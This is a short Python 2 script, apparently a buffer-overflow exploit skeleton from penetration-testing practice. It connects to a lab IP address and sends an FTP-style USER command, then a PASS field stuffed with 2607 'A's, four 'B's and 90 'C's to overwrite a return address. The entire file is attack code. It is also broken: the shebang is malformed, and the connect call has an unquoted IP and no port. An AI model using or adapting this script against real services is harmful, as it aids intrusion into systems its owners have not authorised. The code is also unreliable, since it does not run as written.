#1/usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A' *2607 + 'B' * 4 + 'C' * 90

try:
    print "Sending evil buffer..."
    s.connect((10.11.23.10))
    data = s.recv(1024)
    s.send('USER username + \r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print '\nDone!'
except:
    print 'something went wrong'
